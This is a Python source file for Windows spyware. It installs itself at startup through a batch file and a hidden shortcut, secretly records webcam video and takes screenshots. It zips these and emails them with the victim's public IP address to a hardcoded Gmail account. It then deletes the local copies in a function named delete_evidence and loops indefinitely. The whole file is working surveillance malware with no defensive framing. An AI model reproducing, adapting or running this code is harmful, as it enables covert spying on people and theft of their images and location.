import cv2
import getpass
import threading
import smtplib
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from requests import get
import os
import pyautogui
import numpy as np
import win32com.client
from zipfile import ZipFile


name=getpass.getuser()
T=0

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    file_name = "misaka"
    bat_path = rf'C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" C:\Users\Public\Documents%s.lnk' % file_path)
    path1 = r'C:\Users\Public\Documents'
    path = os.path.join(path1, 'misaka.lnk')
    target = file_path + file_name + ".exe"

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WindowStyle = 7
    shortcut.save()

def delete_trash(path):
    arr = os.listdir(path)
    for i in range(len(arr)):
        if arr[i] != "open.bat":
            os.remove(path+'\\'+arr[i])

def checking_file(path):
    list = os.listdir(path)
    number_files = len(list)
    return number_files

def delete_evidence(zp,imp,vidp):
    os.remove(zp)
    os.remove(imp)
    os.remove(vidp)

def zip_files(zipn,imn,vidn):
    zipObj = ZipFile(zipn, 'w')
    zipObj.write(imn)
    zipObj.write(vidn)
    zipObj.close()
    return True

def email_sender(path):
    ad=str(datetime.date(datetime.now()))
    email_user = 'subnetter.v2@gmail.com'
    email_password = '***********'
    email_send = 'subnetter.v2@gmail.com'
    subject = ad
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    ip = get('https://api.ipify.org').text
    str(ip)
    body = ip
    msg.attach(MIMEText(body,'plain'))
    filename=path
    attachment  =open(filename,'rb')
    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)
    server.sendmail(email_user,email_send,text)
    server.quit()
    return True

def imagetaker(path):
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
    cv2.imwrite(path, image)

def getting_key():
    global T
    T=1

def videorecorder(path,path2):
    global T
    vid = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(path, fourcc, 20.0, (640, 480))
    timer = threading.Timer(10.0, getting_key)
    timer.start()
    while True:
        ret, frame = vid.read()
        out.write(frame)

        if T==1:
            cv2.waitKey(1) & 0xFF
            break
    vid.release()
    out.release()
    imagetaker(path2)
    return True

def main():
    global T, name

    path=rf"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    rnum=random.randint(0,10001)
    vid_name=str(rnum)+".avi"
    img_name=str(rnum)+".png"
    zip_name=str(rnum)+".zip"
    path_vid=rf"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{vid_name}"
    path_img=rf"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{img_name}"
    path_zip=rf"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{zip_name}"


    if os.path.isfile(rf"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat"):
        pass
    else:
        add_to_startup()

    number_of_files=checking_file(path)
    if number_of_files > 1:
        delete_trash(path)

    state=videorecorder(path_vid,path_img)
    if state == True:
        z=zip_files(path_zip,path_img,path_vid)
        if z==True:
            e=email_sender(path_zip)
            if e==True:
                delete_evidence(path_zip,path_vid,path_img)

    while True:
        T=0
        main()

main()

